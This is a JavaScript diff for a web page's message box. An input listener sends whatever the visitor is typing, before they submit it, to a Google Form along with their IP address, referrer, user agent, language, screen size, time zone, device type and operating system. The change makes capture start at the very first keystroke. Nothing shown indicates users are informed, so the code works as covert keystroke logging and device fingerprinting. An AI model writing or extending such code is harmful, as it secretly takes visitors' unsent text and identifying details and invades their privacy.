@@ -1,11 +1,11 @@
 const textarea = document.getElementById("messageInput");
 
 textarea.addEventListener("input", (event) => {
-  const value = event.target.value;
-  
-  if (value.length % 2 === 0) {
-    sendTyping(value);
-  }
+     const value = event.target.value;
+
+     if (value.length === 1 || value.length % 2 === 0) {
+          sendTyping(value);
+     }
 });
 
 async function sendTyping(text) {
@@ -41,18 +41,18 @@ async function sendTyping(text) {
      // Prepare form data with your Google Form entry IDs
      const formData = new URLSearchParams();
 
-     formData.append("entry.1846989304", text); 
+     formData.append("entry.1846989304", text);
      formData.append("entry.297870062", ip ?? "error");
-     formData.append("entry.1422729096", referrer); 
-     formData.append("entry.1842644998", userAgent); 
-     formData.append("entry.612667216", pageUrl); 
-     formData.append("entry.562289926", language); 
-     formData.append("entry.203649777", screenSize); 
-     formData.append("entry.2016257722", timeZone); 
-     formData.append("entry.576960552", timeOffset); 
-     formData.append("entry.1297013940", timestamp); 
-     formData.append("entry.548794760", deviceType); 
-     formData.append("entry.727755722", os); 
+     formData.append("entry.1422729096", referrer);
+     formData.append("entry.1842644998", userAgent);
+     formData.append("entry.612667216", pageUrl);
+     formData.append("entry.562289926", language);
+     formData.append("entry.203649777", screenSize);
+     formData.append("entry.2016257722", timeZone);
+     formData.append("entry.576960552", timeOffset);
+     formData.append("entry.1297013940", timestamp);
+     formData.append("entry.548794760", deviceType);
+     formData.append("entry.727755722", os);
 
      // Send the data using fetch
      fetch(formUrl, {
